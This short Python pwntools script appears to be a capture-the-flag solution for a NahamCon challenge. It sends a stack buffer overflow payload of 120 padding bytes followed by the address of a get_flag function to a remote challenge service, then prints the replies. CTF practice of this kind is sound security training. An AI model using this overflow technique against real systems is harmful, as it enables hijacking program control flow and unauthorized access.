from pwn import *
get_flag = 0x401215
bin_flag = get_flag.to_bytes(4,'little')
print(bin_flag)
io = remote('challenge.nahamcon.com', 30384)
payload=b"A"*120+b"\x15\x12\x40\0"
print(io.recv()) # prompt
io.sendline(payload)
print(io.recv()) # prompt
print(io.recv()) # promp